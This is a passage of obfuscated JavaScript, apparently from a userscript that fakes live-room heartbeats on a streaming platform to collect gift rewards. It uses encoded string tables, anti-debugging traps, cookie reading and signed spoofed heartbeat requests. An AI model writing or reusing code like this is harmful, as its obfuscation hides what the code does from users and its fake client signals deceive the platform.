4f\x4f\x77\x70\x39\x77\x50\x38\x4b\x65\x77\x72\x34\x55\x77\x70\x72\x44\x76\x31\x77\x4b\x44\x41\x78\x69\x77\x36\x64\x41\x77\x72\x30\x3d','\x77\x34\x77\x74\x45\x42\x45\x56\x42\x63\x4b\x31\x59\x58\x68\x65','\x49\x78\x4a\x4f\x47\x6b\x73\x3d','\x55\x38\x4f\x55\x77\x6f\x2f\x43\x6a\x6a\x30\x3d','\x44\x67\x44\x44\x6d\x68\x73\x73\x43\x63\x4f\x53\x77\x34\x58\x44\x75\x51\x3d\x3d','\x77\x34\x33\x43\x6f\x6b\x5a\x6a\x77\x72\x73\x3d','\x62\x38\x4b\x4e\x77\x37\x6f\x46\x77\x35\x50\x44\x67\x38\x4b\x35\x43\x77\x73\x67\x77\x72\x35\x50\x59\x68\x67\x3d','\x66\x30\x55\x76\x4c\x38\x4b\x67\x62\x4d\x4b\x6f\x77\x34\x55\x3d','\x77\x72\x50\x44\x74\x4d\x4b\x6d\x77\x34\x6e\x44\x74\x4d\x4b\x34','\x77\x35\x59\x42\x77\x70\x37\x44\x71\x78\x4a\x46\x62\x7a\x2f\x44\x76\x38\x4b\x61','\x77\x71\x77\x34\x77\x71\x38\x6b\x77\x35\x45\x3d','\x77\x70\x6a\x43\x76\x63\x4f\x5a\x77\x71\x42\x4c','\x4b\x4d\x4b\x52\x58\x4d\x4b\x49\x46\x41\x3d\x3d','\x46\x43\x2f\x44\x76\x7a\x30\x4f','\x4b\x48\x33\x44\x6d\x63\x4f\x6b\x4d\x67\x3d\x3d','\x59\x63\x4b\x75\x77\x72\x70\x72\x77\x37\x72\x44\x6e\x38\x4f\x70\x77\x6f\x4c\x44\x67\x4d\x4b\x46','\x41\x57\x37\x43\x70\x46\x66\x43\x74\x41\x3d\x3d','\x47\x4d\x4f\x41\x77\x37\x76\x44\x69\x4d\x4f\x67','\x52\x6d\x55\x45\x51\x4d\x4b\x5a','\x77\x70\x37\x44\x71\x4d\x4b\x5a\x77\x35\x7a\x44\x73\x51\x3d\x3d','\x51\x38\x4b\x2f\x77\x6f\x70\x72\x77\x34\x67\x3d','\x58\x38\x4f\x4c\x77\x35\x66\x43\x67\x63\x4b\x4c\x77\x71\x52\x53\x77\x35\x59\x37\x77\x36\x55\x6d\x77\x6f\x58\x44\x71\x54\x48\x44\x6a\x41\x3d\x3d','\x77\x72\x48\x44\x74\x6c\x7a\x44\x76\x73\x4b\x37','\x77\x6f\x54\x43\x73\x73\x4f\x54\x49\x46\x72\x43\x6c\x78\x67\x3d','\x77\x35\x48\x44\x6d\x6a\x64\x4b\x77\x70\x55\x30\x41\x32\x35\x5a\x4a\x46\x41\x3d','\x77\x37\x77\x45\x77\x37\x62\x43\x67\x33\x51\x3d','\x77\x36\x67\x52\x4a\x7a\x34\x42','\x4f\x58\x58\x43\x6e\x55\x58\x43\x68\x4d\x4b\x34\x77\x6f\x6a\x44\x69\x67\x3d\x3d','\x5a\x38\x4b\x2b\x77\x71\x74\x32\x77\x34\x76\x44\x68\x4d\x4f\x2b','\x77\x72\x58\x43\x6a\x42\x66\x43\x69\x73\x4b\x43\x77\x70\x63\x3d','\x4e\x63\x4f\x6e\x43\x73\x4f\x2b\x77\x6f\x34\x57','\x77\x6f\x62\x44\x73\x46\x66\x44\x6e\x6e\x34\x4c\x47\x51\x3d\x3d','\x77\x6f\x50\x44\x74\x73\x4b\x39\x51\x4d\x4f\x69\x59\x4d\x4b\x73','\x55\x53\x2f\x44\x6d\x58\x68\x39\x77\x35\x7a\x44\x6d\x56\x4d\x37\x77\x35\x33\x43\x6e\x46\x56\x70\x77\x71\x41\x3d','\x77\x34\x4a\x77\x77\x72\x7a\x44\x6d\x73\x4f\x56','\x77\x37\x6a\x43\x6c\x69\x72\x44\x67\x4d\x4b\x46\x66\x78\x55\x3d','\x49\x42\x55\x56\x51\x4d\x4b\x6b\x61\x73\x4f\x69\x77\x36\x30\x3d','\x5a\x38\x4f\x4c\x77\x35\x66\x44\x69\x4d\x4b\x72','\x48\x4d\x4f\x42\x4f\x73\x4f\x62\x77\x72\x4a\x63\x77\x36\x76\x43\x6d\x6b\x6c\x58\x77\x72\x42\x34\x49\x63\x4f\x50\x77\x34\x74\x58\x77\x70\x30\x55\x63\x44\x55\x3d','\x77\x35\x42\x4b\x77\x37\x30\x62\x77\x6f\x6b\x3d','\x77\x34\x72\x43\x6f\x46\x6c\x69\x77\x70\x30\x44\x4b\x51\x3d\x3d','\x77\x34\x67\x55\x49\x57\x6b\x75\x51\x67\x3d\x3d','\x77\x70\x4d\x6c\x77\x34\x4c\x44\x6f\x32\x49\x3d','\x77\x34\x74\x42\x77\x35\x6c\x37\x54\x51\x3d\x3d','\x4b\x42\x74\x77\x50\x33\x41\x3d','\x52\x54\x6a\x44\x6b\x47\x56\x38\x77\x35\x72\x44\x70\x6b\x30\x3d','\x66\x6c\x34\x57\x66\x63\x4b\x4d','\x77\x71\x6a\x44\x68\x33\x6e\x44\x6f\x33\x52\x51\x58\x41\x3d\x3d','\x62\x63\x4b\x38\x77\x35\x67\x43\x77\x34\x63\x3d','\x63\x63\x4f\x39\x77\x72\x7a\x43\x75\x67\x77\x3d','\x4b\x38\x4f\x50\x77\x6f\x50\x43\x76\x58\x59\x3d','\x44\x38\x4b\x2b\x56\x63\x4b\x66\x44\x51\x3d\x3d','\x52\x6d\x49\x49\x5a\x63\x4b\x30','\x57\x4d\x4f\x35\x77\x34\x6e\x44\x6b\x63\x4b\x63','\x44\x63\x4b\x62\x65\x41\x70\x38','\x77\x37\x77\x4a\x77\x36\x66\x43\x70\x45\x68\x4b\x77\x70\x38\x78\x50\x73\x4b\x56\x77\x37\x4a\x32\x77\x34\x45\x6a','\x77\x34\x45\x55\x4a\x32\x4d\x59\x52\x6d\x38\x3d','\x41\x69\x6e\x44\x6a\x42\x77\x2b','\x6c\x43\x6b\x68\x66\x50\x4c\x4e\x6a\x6b\x73\x74\x6a\x71\x69\x61\x59\x6d\x69\x4e\x4b\x2e\x63\x6f\x6d\x2e\x76\x36\x3d\x3d'];(function(_0x4ac145,_0xbc8f11,_0x5f1b37){var _0xf7e59e=function(_0x213360,_0x47e63f,_0x3d1c0b,_0x4ad151,_0x4c7806){_0x47e63f=_0x47e63f>>0x8,_0x4c7806='po';var _0x4fab86='shift',_0x53d49a='push';if(_0x47e63f<_0x213360){while(--_0x213360){_0x4ad151=_0x4ac145[_0x4fab86]();if(_0x47e63f===_0x213360){_0x47e63f=_0x4ad151;_0x3d1c0b=_0x4ac145[_0x4c7806+'p']();}else if(_0x47e63f&&_0x3d1c0b['replace'](/[lCkhfPLNktqYNK=]/g,'')===_0x47e63f){_0x4ac145[_0x53d49a](_0x4ad151);}}_0x4ac145[_0x53d49a](_0x4ac145[_0x4fab86]());}return 0x405f9;};var _0x402f16=function(){var _0x413749={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x94ebf,_0x3fb6a3,_0x5b4782,_0x4c1842){_0x4c1842=_0x4c1842||{};var _0x49325a=_0x3fb6a3+'='+_0x5b4782;var _0x47de62=0x0;for(var _0x47de62=0x0,_0x9761df=_0x94ebf['length'];_0x47de62<_0x9761df;_0x47de62++){var _0x54047b=_0x94ebf[_0x47de62];_0x49325a+=';\x20'+_0x54047b;var _0x364b4d=_0x94ebf[_0x54047b];_0x94ebf['push'](_0x364b4d);_0x9761df=_0x94ebf['length'];if(_0x364b4d!==!![]){_0x49325a+='='+_0x364b4d;}}_0x4c1842['cookie']=_0x49325a;},'removeCookie':function(){return'dev';},'getCookie':function(_0x266daa,_0x1e6f48){_0x266daa=_0x266daa||function(_0x21cd81){return _0x21cd81;};var _0x4f7c16=_0x266daa(new RegExp('(?:^|;\x20)'+_0x1e6f48['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x1b0c84=typeof _0xodG=='undefined'?'undefined':_0xodG,_0x1ab777=_0x1b0c84['split'](''),_0x496501=_0x1ab777['length'],_0x3c0630=_0x496501-0xe,_0x382544;while(_0x382544=_0x1ab777['pop']()){_0x496501&&(_0x3c0630+=_0x382544['charCodeAt']());}var _0x457b16=function(_0x5f5b93,_0xeb39a7,_0x5d0c1e){_0x5f5b93(++_0xeb39a7,_0x5d0c1e);};_0x3c0630^-_0x496501===-0x524&&(_0x382544=_0x3c0630)&&_0x457b16(_0xf7e59e,_0xbc8f11,_0x5f1b37);return _0x382544>>0x2===0x14b&&_0x4f7c16?decodeURIComponent(_0x4f7c16[0x1]):undefined;}};var _0x34a413=function(){var _0x2263af=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x2263af['test'](_0x413749['removeCookie']['toString']());};_0x413749['updateCookie']=_0x34a413;var _0x3a1d8a='';var _0x503eec=_0x413749['updateCookie']();if(!_0x503eec){_0x413749['setCookie'](['*'],'counter',0x1);}else if(_0x503eec){_0x3a1d8a=_0x413749['getCookie'](null,'counter');}else{_0x413749['removeCookie']();}};_0x402f16();}(_0x192e,0x12c,0x12c00));var _0x52b8=function(_0x14e189,_0x15b386){_0x14e189=~~'0x'['concat'](_0x14e189);var _0x383cf=_0x192e[_0x14e189];if(_0x52b8['bxeIqx']===undefined){(function(){var _0x5e789a=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x7f4280='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5e789a['atob']||(_0x5e789a['atob']=function(_0x2b0179){var _0x24657b=String(_0x2b0179)['replace'](/=+$/,'');for(var _0x14d119=0x0,_0x53f6e9,_0x496344,_0x257d43=0x0,_0x128015='';_0x496344=_0x24657b['charAt'](_0x257d43++);~_0x496344&&(_0x53f6e9=_0x14d119%0x4?_0x53f6e9*0x40+_0x496344:_0x496344,_0x14d119++%0x4)?_0x128015+=String['fromCharCode'](0xff&_0x53f6e9>>(-0x2*_0x14d119&0x6)):0x0){_0x496344=_0x7f4280['indexOf'](_0x496344);}return _0x128015;});}());var _0x2d0ec3=function(_0x6c5cce,_0x15b386){var _0x412a98=[],_0x1a5cbc=0x0,_0x3ceaad,_0x46eacc='',_0x422d5f='';_0x6c5cce=atob(_0x6c5cce);for(var _0x383e1c=0x0,_0x2e311f=_0x6c5cce['length'];_0x383e1c<_0x2e311f;_0x383e1c++){_0x422d5f+='%'+('00'+_0x6c5cce['charCodeAt'](_0x383e1c)['toString'](0x10))['slice'](-0x2);}_0x6c5cce=decodeURIComponent(_0x422d5f);for(var _0x4668de=0x0;_0x4668de<0x100;_0x4668de++){_0x412a98[_0x4668de]=_0x4668de;}for(_0x4668de=0x0;_0x4668de<0x100;_0x4668de++){_0x1a5cbc=(_0x1a5cbc+_0x412a98[_0x4668de]+_0x15b386['charCodeAt'](_0x4668de%_0x15b386['length']))%0x100;_0x3ceaad=_0x412a98[_0x4668de];_0x412a98[_0x4668de]=_0x412a98[_0x1a5cbc];_0x412a98[_0x1a5cbc]=_0x3ceaad;}_0x4668de=0x0;_0x1a5cbc=0x0;for(var _0x1baf76=0x0;_0x1baf76<_0x6c5cce['length'];_0x1baf76++){_0x4668de=(_0x4668de+0x1)%0x100;_0x1a5cbc=(_0x1a5cbc+_0x412a98[_0x4668de])%0x100;_0x3ceaad=_0x412a98[_0x4668de];_0x412a98[_0x4668de]=_0x412a98[_0x1a5cbc];_0x412a98[_0x1a5cbc]=_0x3ceaad;_0x46eacc+=String['fromCharCode'](_0x6c5cce['charCodeAt'](_0x1baf76)^_0x412a98[(_0x412a98[_0x4668de]+_0x412a98[_0x1a5cbc])%0x100]);}return _0x46eacc;};_0x52b8['qRYAkS']=_0x2d0ec3;_0x52b8['ENWyCR']={};_0x52b8['bxeIqx']=!![];}var _0xb61d63=_0x52b8['ENWyCR'][_0x14e189];if(_0xb61d63===undefined){if(_0x52b8['DeUaFs']===undefined){var _0x3e3bea=function(_0x9720d2){this['fqoZQk']=_0x9720d2;this['PCPUtW']=[0x1,0x0,0x0];this['jaZqWH']=function(){return'newState';};this['JQqKVn']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['BleTvf']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3e3bea['prototype']['EeEfCy']=function(){var _0x177692=new RegExp(this['JQqKVn']+this['BleTvf']);var _0x46a6f0=_0x177692['test'](this['jaZqWH']['toString']())?--this['PCPUtW'][0x1]:--this['PCPUtW'][0x0];return this['gRFEQu'](_0x46a6f0);};_0x3e3bea['prototype']['gRFEQu']=function(_0x57427f){if(!Boolean(~_0x57427f)){return _0x57427f;}return this['klvaie'](this['fqoZQk']);};_0x3e3bea['prototype']['klvaie']=function(_0x42e8a4){for(var _0x307bb8=0x0,_0x460e04=this['PCPUtW']['length'];_0x307bb8<_0x460e04;_0x307bb8++){this['PCPUtW']['push'](Math['round'](Math['random']()));_0x460e04=this['PCPUtW']['length'];}return _0x42e8a4(this['PCPUtW'][0x0]);};new _0x3e3bea(_0x52b8)['EeEfCy']();_0x52b8['DeUaFs']=!![];}_0x383cf=_0x52b8['qRYAkS'](_0x383cf,_0x15b386);_0x52b8['ENWyCR'][_0x14e189]=_0x383cf;}else{_0x383cf=_0xb61d63;}return _0x383cf;};var _0x3ebf1c=function(){var _0x5e04c7=!![];return function(_0x417eab,_0x39cfbd){var _0x45fa05=_0x5e04c7?function(){if(_0x39cfbd){var _0x9ff10=_0x39cfbd['apply'](_0x417eab,arguments);_0x39cfbd=null;return _0x9ff10;}}:function(){};_0x5e04c7=![];return _0x45fa05;};}();var _0xb01648=_0x3ebf1c(this,function(){var _0x245898=function(){return'\x64\x65\x76';},_0x1c8fd5=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x199ade=function(){var _0x38c144=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x38c144['\x74\x65\x73\x74'](_0x245898['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x3df5bd=function(){var _0x443109=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x443109['\x74\x65\x73\x74'](_0x1c8fd5['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x5b3d43=function(_0x34ba87){var _0x4e4aab=~-0x1>>0x1+0xff%0x0;if(_0x34ba87['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x4e4aab)){_0xb0a98b(_0x34ba87);}};var _0xb0a98b=function(_0x32123e){var _0x438045=~-0x4>>0x1+0xff%0x0;if(_0x32123e['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x438045){_0x5b3d43(_0x32123e);}};if(!_0x199ade()){if(!_0x3df5bd()){_0x5b3d43('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x5b3d43('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x5b3d43('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0xb01648();const UUID=()=>_0x52b8('0','\x71\x41\x46\x73')[_0x52b8('1','\x64\x44\x63\x54')](/[xy]/g,function(_0x3371b3){var _0x3d2cc4={'\x66\x74\x51\x45\x77':function(_0x20a09c,_0x2385bc){return _0x20a09c|_0x2385bc;},'\x4a\x58\x75\x4a\x66':function(_0xa1a9bc,_0x4e5bb9){return _0xa1a9bc*_0x4e5bb9;},'\x44\x49\x4d\x71\x51':function(_0x5b5260,_0x2fdb27){return _0x5b5260===_0x2fdb27;},'\x79\x71\x67\x5a\x6e':function(_0x22a035,_0x1480d9){return _0x22a035|_0x1480d9;},'\x51\x6e\x66\x77\x68':function(_0x179a4e,_0x1c849e){return _0x179a4e&_0x1c849e;}};var _0x40f2a9=_0x3d2cc4[_0x52b8('2','\x31\x31\x78\x6c')](_0x3d2cc4[_0x52b8('3','\x29\x7a\x73\x5b')](0x10,Math[_0x52b8('4','\x40\x25\x53\x76')]()),0x0);return(_0x3d2cc4[_0x52b8('5','\x49\x43\x28\x41')]('\x78',_0x3371b3)?_0x40f2a9:_0x3d2cc4[_0x52b8('6','\x6b\x6f\x29\x50')](_0x3d2cc4['\x51\x6e\x66\x77\x68'](0x3,_0x40f2a9),0x8))[_0x52b8('7','\x73\x56\x6a\x39')](0x10);});class HeartGiftRoom{constructor(_0x16e72c){var _0x4de82a={'\x4e\x4a\x78\x78\x4b':'\x39\x7c\x33\x7c\x34\x7c\x31\x31\x7c\x31\x7c\x30\x7c\x31\x30\x7c\x37\x7c\x36\x7c\x32\x7c\x35\x7c\x38','\x59\x71\x49\x79\x45':function(_0x288bb5){return _0x288bb5();},'\x65\x66\x75\x59\x54':function(_0x51749c,_0x2cf7ac){return _0x51749c(_0x2cf7ac);},'\x6e\x76\x47\x4f\x66':_0x52b8('8','\x70\x77\x62\x54')};var _0x1cd22e=_0x4de82a[_0x52b8('9','\x61\x44\x73\x29')][_0x52b8('a','\x49\x43\x28\x41')]('\x7c'),_0x3c1d1c=0x0;while(!![]){switch(_0x1cd22e[_0x3c1d1c++]){case'\x30':this[_0x52b8('b','\x67\x26\x4d\x4e')]=_0x16e72c['\x72\x6f\x6f\x6d\x5f\x69\x64'];continue;case'\x31':this[_0x52b8('c','\x59\x73\x7a\x26')]=0x0;continue;case'\x32':this['\x6c\x61\x73\x74\x5f\x74\x69\x6d\x65']=new Date();continue;case'\x33':this[_0x52b8('d','\x59\x73\x7a\x26')]=_0x16e72c[_0x52b8('e','\x70\x66\x40\x6e')];continue;case'\x34':this[_0x52b8('f','\x25\x28\x75\x71')]=_0x16e72c[_0x52b8('10','\x70\x59\x54\x65')];continue;case'\x35':this['\x73\x74\x61\x72\x74\x45\x6e\x74\x65\x72']();continue;case'\x36':this['\x75\x61']=window&&window[_0x52b8('11','\x59\x73\x7a\x26')]?window[_0x52b8('12','\x70\x58\x38\x32')][_0x52b8('13','\x70\x77\x62\x54')]:'';continue;case'\x37':this[_0x52b8('14','\x55\x71\x73\x58')]=_0x4de82a[_0x52b8('15','\x46\x4b\x78\x79')](UUID);continue;case'\x38':this[_0x52b8('16','\x5d\x47\x45\x51')]=0x0;continue;case'\x39':this[_0x52b8('17','\x34\x6f\x33\x70')]=_0x16e72c;continue;case'\x31\x30':this[_0x52b8('18','\x73\x56\x6a\x39')]=_0x4de82a[_0x52b8('19','\x55\x71\x73\x58')](getCookie,_0x4de82a['\x6e\x76\x47\x4f\x66']);continue;case'\x31\x31':;continue;}break;}}async[_0x52b8('1a','\x46\x4b\x78\x79')](){var _0x4da504={'\x69\x41\x67\x42\x68':function(_0xaf5b9d,_0x56757d){return _0xaf5b9d>_0x56757d;},'\x6d\x6c\x54\x4d\x53':function(_0x2c8e8c,_0x5e17d2){return _0x2c8e8c==_0x5e17d2;},'\x4d\x64\x46\x70\x6e':function(_0xd8ba75,_0x3a88a3){return _0xd8ba75!==_0x3a88a3;},'\x6f\x6b\x65\x46\x5a':_0x52b8('1b','\x25\x28\x75\x71'),'\x74\x78\x74\x46\x4a':_0x52b8('1c','\x49\x43\x28\x41'),'\x76\x59\x79\x70\x70':function(_0x59817e,_0xb9a818,_0x2b8907){return _0x59817e(_0xb9a818,_0x2b8907);},'\x55\x4d\x49\x55\x75':function(_0x4e5d32,_0x5c45b4){return _0x4e5d32*_0x5c45b4;},'\x7a\x4f\x68\x68\x65':function(_0x54625d,_0x161a32,_0x20370f){return _0x54625d(_0x161a32,_0x20370f);}};try{if(!HeartGift[_0x52b8('1d','\x64\x5e\x23\x6e')]||_0x4da504[_0x52b8('1e','\x42\x79\x6b\x23')](this[_0x52b8('16','\x5d\x47\x45\x51')],0x3))return;let _0x42be6c={'\x69\x64':[this[_0x52b8('1f','\x21\x50\x6b\x42')],this['\x61\x72\x65\x61\x5f\x69\x64'],this[_0x52b8('20','\x64\x44\x63\x54')],this[_0x52b8('21','\x5d\x47\x45\x51')]],'\x64\x65\x76\x69\x63\x65':[this[_0x52b8('22','\x6b\x6f\x29\x50')],this[_0x52b8('23','\x32\x4b\x4d\x68')]],'\x74\x73':new Date()[_0x52b8('24','\x55\x63\x50\x2a')](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x52b8('25','\x45\x31\x29\x5e')](_0x42be6c);let _0x46e0c9=await BiliPushUtils[_0x52b8('26','\x2a\x38\x4d\x52')][_0x52b8('27','\x64\x5e\x23\x6e')]['\x65\x6e\x74\x65\x72'](_0x42be6c);if(_0x4da504[_0x52b8('28','\x47\x38\x41\x23')](_0x46e0c9[_0x52b8('29','\x73\x56\x6a\x39')],0x0)){if(_0x4da504['\x4d\x64\x46\x70\x6e'](_0x4da504[_0x52b8('2a','\x70\x58\x38\x32')],_0x4da504[_0x52b8('2b','\x45\x31\x29\x5e')])){return e[_0x52b8('2c','\x55\x63\x50\x2a')]['\x69\x64\x5f\x74\x6f\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65\x5f\x6d\x61\x70'][r];}else{var _0x9ed9=_0x4da504[_0x52b8('2d','\x45\x31\x29\x5e')][_0x52b8('2e','\x64\x5e\x23\x6e')]('\x7c'),_0x512f9b=0x0;while(!![]){switch(_0x9ed9[_0x512f9b++]){case'\x30':++this[_0x52b8('2f','\x6b\x6f\x29\x50')];continue;case'\x31':this[_0x52b8('30','\x62\x62\x29\x6a')]=_0x46e0c9[_0x52b8('31','\x75\x40\x21\x64')][_0x52b8('32','\x28\x64\x70\x75')];continue;case'\x32':this[_0x52b8('33','\x5e\x41\x36\x4b')]=_0x46e0c9[_0x52b8('34','\x28\x64\x70\x75')]['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70'];continue;case'\x33':this[_0x52b8('35','\x70\x77\x62\x54')]=_0x46e0c9[_0x52b8('36','\x56\x24\x55\x57')][_0x52b8('37','\x70\x58\x38\x32')];continue;case'\x34':this[_0x52b8('38','\x45\x31\x29\x5e')]=_0x46e0c9['\x64\x61\x74\x61'][_0x52b8('39','\x5d\x63\x5a\x66')];continue;}break;}}}await _0x4da504[_0x52b8('3a','\x67\x26\x4d\x4e')](delayCall,()=>this[_0x52b8('3b','\x65\x34\x59\x79')](),_0x4da504[_0x52b8('3c','\x2a\x47\x64\x5e')](this[_0x52b8('3d','\x33\x77\x24\x77')],0x3e8));}catch(_0x1d8c82){this[_0x52b8('3e','\x70\x58\x38\x32')]++;console[_0x52b8('3f','\x21\x50\x6b\x42')](_0x1d8c82);await _0x4da504['\x7a\x4f\x68\x68\x65'](delayCall,()=>this['\x73\x74\x61\x72\x74\x45\x6e\x74\x65\x72'](),0x3e8);}}async[_0x52b8('40','\x58\x24\x25\x73')](){var _0x5b1003={'\x4c\x66\x6e\x52\x73':function(_0x5594d1,_0x224254){return _0x5594d1<_0x224254;},'\x78\x54\x73\x57\x48':function(_0x3833d9,_0x571490){return _0x3833d9>=_0x571490;},'\x55\x61\x64\x52\x79':function(_0x110ba2,_0x378575){return _0x110ba2<=_0x378575;},'\x71\x54\x4e\x59\x52':function(_0x8484ab,_0x1f5cb4){return _0x8484ab|_0x1f5cb4;},'\x62\x65\x78\x6f\x41':function(_0x48e4d9,_0x218040){return _0x48e4d9+_0x218040;},'\x6b\x45\x6d\x6b\x64':function(_0x3406b3,_0xfac7b6){return _0x3406b3<<_0xfac7b6;},'\x6b\x73\x58\x6e\x65':function(_0x280417,_0x55ce6b){return _0x280417&_0x55ce6b;},'\x73\x6f\x61\x51\x41':function(_0x5d3533,_0x2a8478){return _0x5d3533&_0x2a8478;},'\x4b\x61\x46\x66\x65':function(_0x1d4c5b,_0x85412d){return _0x1d4c5b>>_0x85412d;},'\x57\x53\x53\x64\x6f':function(_0x2c2e74,_0x5d3d90){return _0x2c2e74&_0x5d3d90;},'\x6e\x54\x48\x61\x53':function(_0x28c841,_0x311dfe){return _0x28c841|_0x311dfe;},'\x43\x6a\x4b\x70\x62':function(_0x2a8a07,_0x1fd1d8){return _0x2a8a07&_0x1fd1d8;},'\x77\x4b\x4f\x73\x71':function(_0x4d1065,_0x97764e){return _0x4d1065|_0x97764e;},'\x51\x79\x6c\x73\x58':function(_0x493c5e,_0x3936e8){return _0x493c5e>>_0x3936e8;},'\x61\x63\x6b\x6f\x4d':function(_0x44ab5e,_0x23f306){return _0x44ab5e&_0x23f306;},'\x6b\x48\x6d\x75\x4e':function(_0x5498a6,_0x35dbc2){return _0x5498a6|_0x35dbc2;},'\x49\x57\x4f\x55\x75':function(_0x3bc8a2,_0x5bd95b){return _0x3bc8a2|_0x5bd95b;},'\x77\x56\x46\x6c\x54':function(_0x16f5ae,_0x69e201){return _0x16f5ae<=_0x69e201;},'\x57\x6f\x78\x74\x4f':function(_0x41ec81,_0x32043d){return _0x41ec81|_0x32043d;},'\x79\x71\x56\x55\x53':function(_0x46213a,_0x22d5d1){return _0x46213a&_0x22d5d1;},'\x4f\x54\x77\x68\x4a':function(_0x34d79b,_0x1d1b44){return _0x34d79b>>_0x1d1b44;},'\x71\x53\x56\x55\x66':function(_0x549ed1,_0x37005d){return _0x549ed1&_0x37005d;},'\x4e\x41\x6f\x58\x77':function(_0x55f4c0,_0x38e40e){return _0x55f4c0>>_0x38e40e;},'\x63\x6d\x63\x70\x4d':function(_0x2bbb68,_0x562ef7){return _0x2bbb68|_0x562ef7;},'\x46\x70\x43\x58\x6b':function(_0x427d17,_0x5dc90c){return _0x427d17&_0x5dc90c;},'\x56\x74\x7a\x66\x41':function(_0x489504,_0x217ede){return _0x489504|_0x217ede;},'\x53\x48\x57\x46\x4c':function(_0x4a12a9,_0x167ad0){return _0x4a12a9>>_0x167ad0;},'\x6b\x70\x59\x54\x63':function(_0x3cc432,_0x1c55ad){return _0x3cc432>>_0x1c55ad;},'\x53\x4c\x54\x67\x72':function(_0x5be4f6,_0x13a3c2){return _0x5be4f6>>_0x13a3c2;},'\x65\x4c\x74\x4f\x47':function(_0x1008b3,_0x39d6f6){return _0x1008b3|_0x39d6f6;},'\x7a\x6e\x70\x69\x53':function(_0x5e99fd,_0x22631d){return _0x5e99fd&_0x22631d;},'\x4b\x4d\x53\x7a\x62':function(_0x217077,_0x4ece7d){return _0x217077>>_0x4ece7d;},'\x77\x48\x62\x74\x6a':function(_0x195d4f,_0x213e54){return _0x195d4f|_0x213e54;},'\x4e\x71\x64\x77\x6c':function(_0x1d9587,_0x421dee){return _0x1d9587&_0x421dee;},'\x59\x56\x63\x56\x79':function(_0x5a67c9,_0x1d48eb){return _0x5a67c9>_0x1d48eb;},'\x66\x4b\x59\x65\x5a':function(_0x5ea1f6,_0x3813cf){return _0x5ea1f6==_0x3813cf;},'\x6e\x73\x45\x4a\x64':function(_0x1a4dae,_0x2812ac){return _0x1a4dae<=_0x2812ac;},'\x4e\x61\x65\x44\x43':function(_0x39ef6e,_0x33b1be){return _0x39ef6e!==_0x33b1be;},'\x61\x63\x51\x62\x4d':_0x52b8('41','\x25\x28\x75\x71'),'\x6f\x41\x73\x6a\x7a':function(_0x194d63,_0x2755d6,_0x2123a9){return _0x194d63(_0x2755d6,_0x2123a9);},'\x57\x55\x57\x6a\x59':function(_0x4b48a3,_0x22bbf4){return _0x4b48a3*_0x22bbf4;},'\x57\x49\x42\x52\x55':function(_0x2d8e51,_0x4b34e1){return _0x2d8e51===_0x4b34e1;},'\x67\x66\x62\x4f\x6c':_0x52b8('42','\x66\x47\x4f\x5b'),'\x76\x42\x43\x4e\x45':'\x44\x59\x57\x68\x7a','\x6e\x41\x6e\x74\x75':function(_0x1f1986,_0x13038a){return _0x1f1986(_0x13038a);},'\x6a\x76\x6d\x73\x70':function(_0x6f9797,_0x4d2afd,_0x499e2f){return _0x6f9797(_0x4d2afd,_0x499e2f);}};try{if(!HeartGift[_0x52b8('43','\x5d\x47\x45\x51')]||_0x5b1003[_0x52b8('44','\x64\x44\x63\x54')](this[_0x52b8('45','\x32\x4b\x4d\x68')],0x3))return;let _0x15ea12={'\x69\x64':[this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'],this[_0x52b8('46','\x55\x63\x50\x2a')],this[_0x52b8('47','\x5e\x41\x36\x4b')],this[_0x52b8('48','\x28\x25\x25\x25')]],'\x64\x65\x76\x69\x63\x65':[this[_0x52b8('49','\x64\x5e\x23\x6e')],this[_0x52b8('4a','\x70\x77\x62\x54')]],'\x65\x74\x73':this['\x65\x74\x73'],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this[_0x52b8('4b','\x52\x6e\x61\x4a')],'\x74\x69\x6d\x65':this['\x74\x69\x6d\x65'],'\x74\x73':new Date()[_0x52b8('4c','\x59\x73\x7a\x26')](),'\x75\x61':this['\x75\x61']};KeySign[_0x52b8('4d','\x28\x25\x25\x25')](_0x15ea12);let _0x30b594=BiliPushUtils['\x73\x69\x67\x6e'](JSON[_0x52b8('4e','\x65\x34\x59\x79')](_0x15ea12),this[_0x52b8('4f','\x21\x50\x6b\x42')]);if(_0x30b594){_0x15ea12['\x73']=_0x30b594;let _0x2ca90e=await 